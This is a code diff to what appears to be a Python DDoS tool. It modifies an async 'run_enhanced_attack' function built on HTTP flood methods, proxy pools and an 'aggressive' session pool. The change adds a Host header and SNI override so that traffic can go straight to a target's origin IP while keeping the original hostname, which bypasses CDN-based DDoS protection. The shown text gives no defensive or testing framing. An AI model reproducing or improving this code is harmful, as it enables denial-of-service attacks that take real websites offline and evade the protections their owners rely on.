@@ -1529,11 +1529,14 @@ ATTACK_METHODS = {
 
 async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_flood",
                               rps: int = 100, proxy: Optional[str] = None,
-                              proxy_pool = None, proxy_type: str = "datacenter",
+                              proxy_pool=None, proxy_type: str = "datacenter",
                               origin_ip: Optional[str] = None,
+                              host_header: Optional[str] = None,
                               live_stats: Optional[dict] = None) -> Dict:
     """
     Enhanced attack with real-time live_stats updates.
+    
+    host_header: Override for HTTP Host header + SNI (used with origin_ip bypass)
     
     live_stats dict (if provided) is updated every 0.2s during attack with:
     {
@@ -1547,6 +1550,11 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
     attack_func = ATTACK_METHODS[method]
     session_pool = OptimizedSessionPool(max_sessions=500)  # AGGRESSIVE pool (was 20)
 
+    # Resolve host_header (override for origin bypass)
+    parsed_original = urlparse(url)
+    original_hostname = parsed_original.hostname or parsed_original.netloc
+    host_header_override = host_header or None
+    
     if origin_ip:
         # Health check origin before using it
         import socket as _sock
@@ -1554,7 +1562,7 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
         try:
             _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
             _s.settimeout(3)
-            _port = 443 if urlparse(url).scheme == "https" else 80
+            _port = 443 if parsed_original.scheme == "https" else 80
             _s.connect((origin_ip, _port))
             _s.close()
             _origin_alive = True
@@ -1562,11 +1570,15 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
             _origin_alive = False
         
         if _origin_alive:
-            parsed = urlparse(url)
-            url = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
+            parsed = parsed_original
+            path = parsed.path or '/'
             if parsed.query:
-                url += "?" + parsed.query
-            logger.info(f"Origin IP {origin_ip} is alive, attacking directly")
+                path += '?' + parsed.query
+            # Keep original URL for hostname extraction but save origin_ip for connection
+            url = f"{parsed.scheme}://{origin_ip}{path}"
+            if not host_header_override:
+                host_header_override = original_hostname
+            logger.info(f"Origin IP {origin_ip} is alive, attacking directly (Host: {host_header_override})")
         else:
             logger.warning(f"Origin IP {origin_ip} is DEAD (timeout), attacking via CDN instead")
             # Keep original URL (attack via CDN)
@@ -1621,7 +1633,7 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
                 result = await attack_func(
                     url=url, proxy=worker_proxy, session_pool=session_pool,
                     duration=per_worker_duration, target_rps=rps // num_workers,
-                    metrics_out=shared_metrics,  # Shared dict = live updates visible to updater
+                    metrics_out=shared_metrics, host_header=host_header_override,
                 )
             except TypeError:
                 result = await attack_func(
